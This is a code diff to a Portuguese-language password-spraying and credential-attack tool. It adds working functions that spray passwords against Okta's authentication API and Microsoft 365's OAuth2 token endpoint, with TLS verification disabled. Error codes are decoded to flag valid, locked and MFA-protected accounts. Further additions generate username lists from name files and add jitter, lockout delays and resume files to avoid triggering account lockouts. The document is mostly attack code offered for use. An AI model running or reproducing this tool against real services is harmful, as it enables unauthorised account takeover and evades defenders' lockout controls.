@@ -25,7 +25,7 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict
 
-VERSAO = "2.0.0"
+VERSAO = "2.1.0"
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -100,8 +100,9 @@ def _build_banner():
         f"{D}{hl}{X}",
         f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
         f"{D}{hl}{X}",
-        f"{D}spray  stuff  defaults  hash  vault{X}",
-        f"{D}--protocol --userlist --passlist --delay{X}",
+        f"{D}spray  stuff  defaults  hash  vault  okta{X}",
+        f"{D}--jitter --lockout-delay --resume --gen-users{X}",
+        f"{D}o365 OAuth2 / Okta /api/v1/authn / MFA detect{X}",
     ]
 
     out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
@@ -516,6 +517,115 @@ def _testar_smb(host, usuario, senha, dominio="", porta=445, timeout=5):
         return False, None
 
 
+def _testar_okta(dominio_okta, usuario, senha, timeout=10):
+    """Testa autenticacao Okta via /api/v1/authn."""
+    url = f"https://{dominio_okta}/api/v1/authn"
+    import json as _json
+    import ssl as _ssl
+    payload = _json.dumps({"username": usuario, "password": senha}).encode()
+    req = urllib.request.Request(url, data=payload, method="POST", headers={
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0",
+    })
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+            body = r.read().decode("utf-8", errors="ignore")
+            data = _json.loads(body)
+            status = data.get("status", "")
+            if status == "SUCCESS":
+                return True, "SUCCESS"
+            if status == "MFA_ENROLL" or status == "MFA_REQUIRED":
+                return True, f"MFA_REQUIRED({status})"
+            return False, status
+    except urllib.error.HTTPError as e:
+        if e.code == 401:
+            try:
+                body = e.read().decode("utf-8", errors="ignore")
+                data = _json.loads(body)
+                ec = data.get("errorCode", "")
+                if "LOCKED" in ec:
+                    return False, "LOCKED"
+            except Exception:
+                pass
+            return False, 401
+        return False, e.code
+    except Exception:
+        return False, None
+
+
+def _testar_o365_oauth(usuario, senha, timeout=10):
+    """Spray O365 via Microsoft OAuth2 /common/oauth2/token endpoint."""
+    import json as _json, ssl as _ssl, urllib.parse as _up
+    url = "https://login.microsoftonline.com/common/oauth2/token"
+    body = _up.urlencode({
+        "grant_type": "password",
+        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # well-known Azure AD PS client
+        "resource": "https://graph.microsoft.com",
+        "username": usuario, "password": senha,
+        "scope": "openid",
+    }).encode()
+    req = urllib.request.Request(url, data=body, method="POST", headers={
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    })
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+            data = _json.loads(r.read())
+            if "access_token" in data:
+                return True, "TOKEN_OK"
+            return False, data.get("error", "unknown")
+    except urllib.error.HTTPError as e:
+        try:
+            data = _json.loads(e.read())
+            ec = data.get("error", ""); ed = data.get("error_description", "")
+            if "AADSTS50126" in ed: return False, "WRONG_PASS"
+            if "AADSTS50053" in ed: return False, "LOCKED"
+            if "AADSTS50055" in ed: return True, "EXPIRED_PASS"
+            if "AADSTS50057" in ed: return False, "DISABLED"
+            if "AADSTS70011" in ed: return False, "SCOPE_ERR"
+            if "AADSTS50076" in ed: return True, "MFA_REQUIRED"
+        except Exception:
+            pass
+        return False, e.code
+    except Exception:
+        return False, None
+
+
+def gerar_usuarios(primeiros_nomes, ultimos_nomes, pattern="fi.ln"):
+    """Gera lista de usernames a partir de nomes com base em um padrao."""
+    usuarios = []
+    for fn in primeiros_nomes:
+        for ln in ultimos_nomes:
+            fn = fn.strip().lower(); ln = ln.strip().lower()
+            if not fn or not ln:
+                continue
+            p = pattern.lower()
+            p = p.replace("fn", fn)
+            p = p.replace("ln", ln)
+            p = p.replace("fi", fn[0])
+            p = p.replace("li", ln[0])
+            usuarios.append(p)
+    return list(dict.fromkeys(usuarios))
+
+
+def _carregar_tentativas(resume_file):
+    tentadas = set()
+    try:
+        with open(resume_file, "r") as f:
+            for line in f:
+                tentadas.add(line.strip())
+    except FileNotFoundError:
+        pass
+    return tentadas
+
+
 def kerberos_user_enum(dc_host, usuarios, dominio, timeout=5):
     """Enumeracao de usuarios via Kerberos AS-REQ (sem causar lockout)."""
     _secao(f"KERBEROS USER ENUM - {dc_host} / {dominio}")
@@ -565,13 +675,26 @@ def mostrar_ntlm_relay_hints():
 # ──────────────────────────────────────────────────────────────────
 
 def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
-                   delay=0.5, threads=5, vault_senha=None, verbose=False):
+                   delay=0.5, threads=5, vault_senha=None, verbose=False,
+                   jitter=0.0, lockout_delay=0, resume_file=None,
+                   okta_domain=None):
     """
     Password spraying: para cada senha, tenta todos os usuarios antes de passar para proxima.
     Essa abordagem evita lockout por usuario.
     """
     _secao(f"PASSWORD SPRAY - {protocolo.upper()} - {alvo}")
     _log(f"Usuarios: {len(usuarios)} | Senhas: {len(senhas)} | Delay: {delay}s", "INFO")
+    if jitter > 0:
+        _log(f"Jitter: 0-{jitter}s", "INFO")
+    if lockout_delay > 0:
+        _log(f"Lockout delay: {lockout_delay}s entre rounds", "INFO")
+
+    tentadas = set()
+    if resume_file:
+        tentadas = _carregar_tentativas(resume_file)
+        if tentadas:
+            _log(f"Resume: {len(tentadas)} tentativa(s) anteriores ignoradas", "INFO")
+    resume_fh = open(resume_file, "a") if resume_file else None
 
     lockout = LockoutDetector(limiar=5, janela_s=60, pausa_s=60)
     achados = []
@@ -582,6 +705,9 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
 
     def _tentar(usuario, senha):
         nonlocal tentativas
+        chave = f"{usuario}:{senha}"
+        if chave in tentadas:
+            return
         if protocolo in ("http", "https"):
             ok, code = _testar_http_basic(alvo, usuario, senha, timeout=timeout)
         elif protocolo == "smtp":
@@ -597,7 +723,10 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
             host = alvo.replace("https://", "").replace("http://", "").split("/")[0]
             ok, code = _testar_owa(host, usuario, senha, timeout=timeout)
         elif protocolo == "o365":
-            ok, code = _testar_o365(usuario, senha, timeout=timeout)
+            ok, code = _testar_o365_oauth(usuario, senha, timeout=timeout)
+        elif protocolo == "okta":
+            dom = okta_domain or alvo
+            ok, code = _testar_okta(dom, usuario, senha, timeout=timeout)
         elif protocolo == "smb":
             host, porta = (alvo.split(":") + ["445"])[:2]
             ok, code = _testar_smb(host, usuario, senha, porta=int(porta), timeout=timeout)
@@ -606,23 +735,32 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
 
         with _lock:
             tentativas[0] += 1
+            tentadas.add(chave)
+            if resume_fh:
+                resume_fh.write(chave + "\n"); resume_fh.flush()
             if ok:
-                _log(f"CREDENCIAL VALIDA: {usuario}:{senha} [{protocolo}] [{code}]", "CRITICO")
+                lbl = "CREDENCIAL VALIDA"
+                if isinstance(code, str) and "MFA" in code:
+                    lbl = "VALIDA (MFA)"
+                _log(f"{lbl}: {usuario}:{senha} [{protocolo}] [{code}]", "CRITICO")
                 achados.append({"usuario": usuario, "senha": senha, "protocolo": protocolo,
-                                 "alvo": alvo, "codigo": code})
+                                 "alvo": alvo, "codigo": code, "mfa": "MFA" in str(code)})
                 if vault:
                     vault.adicionar(usuario, senha, alvo, protocolo)
+            elif code and str(code) == "LOCKED":
+                _log(f"LOCKOUT detectado: {usuario}", "ALERTA")
             elif verbose and code:
                 _log(f"Falha: {usuario}:{senha} [{code}]", "INFO")
 
             if not ok:
                 lockout.registrar_falha(usuario)
 
-        if delay > 0:
-            time.sleep(delay + random.uniform(0, delay * 0.3))
+        t = delay + random.uniform(0, jitter) if jitter > 0 else delay
+        if t > 0:
+            time.sleep(t)
 
     # Spray: uma senha por vez para todos os usuarios
-    for senha in senhas:
+    for i, senha in enumerate(senhas):
         _log(f"Testando senha: '{senha}' em {len(usuarios)} usuario(s)...", "INFO")
         with ThreadPoolExecutor(max_workers=threads) as ex:
             futs = {ex.submit(_tentar, u, senha): u for u in usuarios}
@@ -632,7 +770,13 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
                 except Exception as e:
                     if verbose:
                         _log(f"Erro na thread: {e}", "ERRO")
+        # lockout delay between password rounds
+        if lockout_delay > 0 and i < len(senhas) - 1:
+            _log(f"Aguardando {lockout_delay}s (lockout delay) antes do proximo round...", "INFO")
+            time.sleep(lockout_delay)
 
+    if resume_fh:
+        resume_fh.close()
     _log(f"Spray concluido: {tentativas[0]} tentativas | {len(achados)} credencial(is) encontrada(s)", "OK")
     return achados
 
@@ -940,9 +1084,9 @@ def main():
     # spray
     p_spray = sub.add_parser("spray", help="Password spraying (uma senha por vez, todos os usuarios)")
     p_spray.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
-    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "smb"],
+    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "okta", "smb"],
                           default="http", help="Protocolo (padrao: http)")
-    p_spray.add_argument("--userlist", required=True, help="Arquivo com lista de usuarios")
+    p_spray.add_argument("--userlist", default=None, help="Arquivo com lista de usuarios (ou use --gen-users)")
     p_spray.add_argument("--passlist", help="Arquivo com lista de senhas (padrao: lista interna)")
     p_spray.add_argument("--delay", type=float, default=1.0,
                           help="Delay em segundos entre tentativas (padrao: 1.0)")
@@ -955,6 +1099,18 @@ def main():
     p_spray.add_argument("--html-output", metavar="FILE", help="Salvar relatorio HTML")
     p_spray.add_argument("--no-banner", action="store_true", help="Suprimir banner")
     p_spray.add_argument("--verbose", action="store_true", help="Saida detalhada")
+    p_spray.add_argument("--jitter", type=float, default=0.0, metavar="S",
+                         help="Jitter aleatorio 0-S adicionado ao delay (ex: 1.5)")
+    p_spray.add_argument("--lockout-delay", type=int, default=0, metavar="S",
+                         help="Pausa entre rounds de senha para evitar lockout (segundos)")
+    p_spray.add_argument("--resume", metavar="FILE", dest="resume_file",
+                         help="Arquivo para salvar/retomar tentativas (ex: ~/.ghost-spray/tried.txt)")
+    p_spray.add_argument("--okta-domain", metavar="DOMAIN",
+                         help="Dominio Okta para --protocol okta (ex: empresa.okta.com)")
+    p_spray.add_argument("--gen-users", nargs=2, metavar=("FIRST_FILE", "LAST_FILE"),
+                         help="Gerar usernames a partir de arquivos de nomes (--gen-users first.txt last.txt)")
+    p_spray.add_argument("--gen-pattern", default="fi.ln",
+                         help="Padrao de username: fn=first ln=last fi=first_initial li=last_initial (padrao: fi.ln)")
 
     # stuff (credential stuffing)
     p_stuff = sub.add_parser("stuff", help="Credential stuffing com breach database")
@@ -1018,13 +1174,28 @@ def main():
         _log(f"Proxy ativo: {proxy}", "INFO")
 
     if args.modo == "spray":
-        # Carregar usuarios
-        try:
-            with open(args.userlist, "r", encoding="utf-8", errors="ignore") as f:
-                usuarios = [l.strip() for l in f if l.strip()]
-        except Exception as e:
-            _log(f"Erro ao ler userlist: {e}", "ERRO")
+        if not getattr(args, "userlist", None) and not getattr(args, "gen_users", None):
+            _log("Use --userlist FILE ou --gen-users FIRST_FILE LAST_FILE", "ERRO")
             sys.exit(1)
+        # Carregar usuarios
+        if getattr(args, "gen_users", None):
+            try:
+                with open(args.gen_users[0], "r", encoding="utf-8", errors="ignore") as f:
+                    primeiros = [l.strip() for l in f if l.strip()]
+                with open(args.gen_users[1], "r", encoding="utf-8", errors="ignore") as f:
+                    ultimos = [l.strip() for l in f if l.strip()]
+                usuarios = gerar_usuarios(primeiros, ultimos, getattr(args, "gen_pattern", "fi.ln"))
+                _log(f"Usuarios gerados: {len(usuarios)} (pattern: {args.gen_pattern})", "INFO")
+            except Exception as e:
+                _log(f"Erro ao gerar usernames: {e}", "ERRO")
+                sys.exit(1)
+        else:
+            try:
+                with open(args.userlist, "r", encoding="utf-8", errors="ignore") as f:
+                    usuarios = [l.strip() for l in f if l.strip()]
+            except Exception as e:
+                _log(f"Erro ao ler userlist: {e}", "ERRO")
+                sys.exit(1)
 
         # Carregar senhas
         if args.passlist:
@@ -1056,7 +1227,11 @@ def main():
                 alvo, usuarios, senhas,
                 protocolo=args.protocol, delay=args.delay,
                 threads=args.threads, vault_senha=args.vault_pass,
-                verbose=args.verbose
+                verbose=args.verbose,
+                jitter=getattr(args, "jitter", 0.0),
+                lockout_delay=getattr(args, "lockout_delay", 0),
+                resume_file=getattr(args, "resume_file", None),
+                okta_domain=getattr(args, "okta_domain", None),
             )
             todos_achados.extend(achados)
         achados = todos_achados
